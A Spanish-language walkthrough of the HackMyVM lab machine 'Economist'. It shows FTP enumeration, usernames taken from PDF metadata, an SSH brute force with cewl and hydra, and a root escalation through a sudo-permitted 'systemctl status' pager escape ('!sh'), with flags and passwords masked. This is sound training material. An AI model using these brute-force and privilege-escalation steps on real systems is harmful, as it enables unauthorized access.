---
title: Economist HackMyVM
published: true
---

- Ip atacante - 10.0.2.39
- Ip victima - 10.0.2.44

## Encontrar la maquina

Primero buscamos la maquina en la red con un ``arp-scan``
```bash
❯ sudo arp-scan -l               
Interface: eth0, type: EN10MB, MAC:
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.44
```

## Nmap

```bash
❯ sudo nmap -Pn -n -A -p 21,22,80 -T4 10.0.2.44
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-09 20:29 EST
Nmap scan report for 10.0.2.44
Host is up (0.0012s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.39
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 1000     1000       173864 Sep 13 11:40 Brochure-1.pdf
| -rw-rw-r--    1 1000     1000       183931 Sep 13 11:37 Brochure-2.pdf
| -rw-rw-r--    1 1000     1000       465409 Sep 13 14:18 Financial-infographics-poster.pdf
| -rw-rw-r--    1 1000     1000       269546 Sep 13 14:19 Gameboard-poster.pdf
| -rw-rw-r--    1 1000     1000       126644 Sep 13 14:20 Growth-timeline.pdf
|_-rw-rw-r--    1 1000     1000      1170323 Sep 13 10:13 Population-poster.pdf
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d9:fe:dc:77:b8:fc:e6:4c:cf:15:29:a7:e7:21:a2:62 (RSA)
|   256 be:66:01:fb:d5:85:68:c7:25:94:b9:00:f9:cd:41:01 (ECDSA)
|_  256 18:b4:74:4f:f2:3c:b3:13:1a:24:13:46:5c:fa:40:72 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home - Elite Economists
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 08:00:27:E0:55:E3 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.19 ms 10.0.2.44
```

Ya que el FTP tiene acceso anonimo, me conecto con ``anonymous``

```bash
❯ ftp 10.0.2.44
Connected to 10.0.2.44.
220 (vsFTPd 3.0.3)
Name (10.0.2.44:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||55221|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000       173864 Sep 13 11:40 Brochure-1.pdf
-rw-rw-r--    1 1000     1000       183931 Sep 13 11:37 Brochure-2.pdf
-rw-rw-r--    1 1000     1000       465409 Sep 13 14:18 Financial-infographics-poster.pdf
-rw-rw-r--    1 1000     1000       269546 Sep 13 14:19 Gameboard-poster.pdf
-rw-rw-r--    1 1000     1000       126644 Sep 13 14:20 Growth-timeline.pdf
-rw-rw-r--    1 1000     1000      1170323 Sep 13 10:13 Population-poster.pdf
226 Directory send OK.
```

Nos salimos y descargamos todo de un solo comando

```bash
❯ wget -m ftp://anonymous:anonymous@10.0.2.44
```

Con eso descargamos todo los pdf y los revisamos. La unica informacion quiza importante es 

```txt
info@elite-economists.hmv
elite-economists.hmv
```
Con el exiftool podemos encontrar el Author
```txt
❯ exiftool Brochure-1.pdf                        
ExifTool Version Number         : 12.67
File Name                       : Brochure-1.pdf
Directory                       : .
File Size                       : 174 kB
File Modification Date/Time     : 2023:09:13 11:40:00-04:00
File Access Date/Time           : 2024:01:09 20:38:21-05:00
File Inode Change Date/Time     : 2024:01:09 20:36:31-05:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.6
Linearized                      : No
Page Count                      : 2
XMP Toolkit                     : Image::ExifTool 12.40
Subject                         : We are here for your wealth
Title                           : Elite Economists brochure 1
Author                          : joseph
Creator                         : Impress
Producer                        : LibreOffice 7.3
Create Date                     : 2023:09:13 12:03:17+02:00
```

```bash
❯ exiftool *.pdf | grep Author   
Author                          : joseph
Author                          : richard
Author                          : crystal
Author                          : catherine
Author                          : catherine
```

Guardo la informacion en authors
```txt
❯ cat authors  
joseph
richard
crystal
catherine
```

Ingresamos a la pagina, pero no encontramos nada importante. Asi que creare un diccionario de passwords para hacer un ataque de fuerza bruta

```bash
❯ cewl http://10.0.2.44/ -m 8 -w passwords --lowercase
```

Con hydra hacemos una ataque de fuerza bruta por ssh 

```bash
❯ hydra -L authors -P passwords ssh://10.0.2.44 -t 50
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-09 21:04:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 50 tasks per 1 server, overall 50 tasks, 568 login tries (l:4/p:142), ~12 tries per task
[DATA] attacking ssh://10.0.2.44:22/
[22][ssh] host: 10.0.2.44   login: joseph   password: wea*******
```
## SSH

Ingresamos por ssh
```bash
❯ ssh joseph@10.0.2.44 

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.2.44' (ED25519) to the list of known hosts.
joseph@10.0.2.44's password: wea*******

joseph@elite-economists:~$ 
```

# User 

Nada mas entrar nos dan la bienvenida con la bandera de usuario

```bash
joseph@elite-economists:~$ ls
user.txt
joseph@elite-economists:~$ cat user.txt                                                                                          
                      ...................                 ....................                      
                 .............................        .............................                 
             ............              ...........     ......              ............             
           ........                         ........                             ........           
        ........              ...              ........           ....              .......         
       ......                .....         ..     ......          .....                ......       
     .............................        .....     ......        .............................     
    ..............................       .....        .....       ..............................    
                                        .....          .....                                        
                                       .....            .....                                       
                                      .....              .....                                      
                                      .....              .....                                      
                                     .....                ....                                      
 .................................................................................................. 
................................................................................................... 
                                     .....               .....                                      
                                      .....              .....                                      
                                      .....              .....                                      
                                       .....            .....                                       
                                        .....          .....                                        
    ..............................       .....        .....       ..............................    
     .............................        ......     .....        .............................     
       ......                .....         .......     ..         .....                ......       
        ........              ...            .......              ....              .......         
           ........                            .........                         ........           
             ...........               ......     ...........               ...........             
                ..............................       ..............................                 
                     .....................                ....................                                      
Flag: HMV{*************************}
```

Momento de intentar de escalar privilegios

```bash
joseph@elite-economists:~$ sudo -l
Matching Defaults entries for joseph on elite-economists:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joseph may run the following commands on elite-economists:
    (ALL) NOPASSWD: /usr/bin/systemctl status
```

Corremos el comando que nos proporcionan y con la ayuda de GTFObins sabemos que podemos crearnos una shell como root

```bash
joseph@elite-economists:~$ sudo /usr/bin/systemctl status
● elite-economists
    State: running
     Jobs: 0 queued
   Failed: 0 units
    Since: Wed 2024-01-10 01:15:24 UTC; 1h 7min ago
   CGroup: /
           ├─user.slice 
           │ └─user-1001.slice 
           │   ├─user@1001.service …
           │   │ └─init.scope 
           │   │   ├─2420 /lib/systemd/systemd --user
           │   │   └─2426 (sd-pam)
           │   └─session-4.scope 
           │     ├─2405 sshd: joseph [priv]
           │     ├─2507 sshd: joseph@pts/0
           │     ├─2508 -bash
           │     ├─2541 sudo /usr/bin/systemctl status
           │     ├─2542 /usr/bin/systemctl status
           │     └─2543 pager
           ├─init.scope 
           │ └─1 /sbin/init maybe-ubiquity
           └─system.slice 
             ├─irqbalance.service 
             │ └─692 /usr/sbin/irqbalance --foreground
             ├─apache2.service 
             │ ├─775 /usr/sbin/apache2 -k start
             │ ├─778 /usr/sbin/apache2 -k start
             │ └─779 /usr/sbin/apache2 -k start
             ├─systemd-networkd.service 
             │ └─667 /lib/systemd/systemd-networkd
             ├─systemd-udevd.service 
             │ └─416 /lib/systemd/systemd-udevd
             ├─cron.service 
             │ └─685 /usr/sbin/cron -f
             ├─polkit.service 
             │ └─695 /usr/lib/policykit-1/polkitd --no-debug
             ├─networkd-dispatcher.service 
             │ └─694 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
             ├─multipathd.service 
             │ └─585 /sbin/multipathd -d -s
             ├─accounts-daemon.service 
             │ └─681 /usr/lib/accountsservice/accounts-daemon
             ├─ModemManager.service 
             │ └─765 /usr/sbin/ModemManager
             ├─systemd-journald.service 
             │ └─377 /lib/systemd/systemd-journald


!sh
# bash
root@elite-economists:/home/joseph#
```

## Root
Ingresamos como root y buscamos la bandera
```bash
root@elite-economists:/home/joseph# cd /root
root@elite-economists:~# ls
root.txt  snap
root@elite-economists:~# cat root.txt


                                                                                                    
                                                                                                    
                      ...................                 ....................                      
                 .............................        .............................                 
             ............              ...........     ......              ............             
           ........                         ........                             ........           
        ........              ...              ........           ....              .......         
       ......                .....         ..     ......          .....                ......       
     .............................        .....     ......        .............................     
    ..............................       .....        .....       ..............................    
                                        .....          .....                                        
                                       .....            .....                                       
                                      .....              .....                                      
                                      .....              .....                                      
                                     .....                ....                                      
 .................................................................................................. 
................................................................................................... 
                                     .....               .....                                      
                                      .....              .....                                      
                                      .....              .....                                      
                                       .....            .....                                       
                                        .....          .....                                        
    ..............................       .....        .....       ..............................    
     .............................        ......     .....        .............................     
       ......                .....         .......     ..         .....                ......       
        ........              ...            .......              ....              .......         
           ........                            .........                         ........           
             ...........               ......     ...........               ...........             
                ..............................       ..............................                 
                     .....................                ....................                        
Flag: HMV{*************************}
```





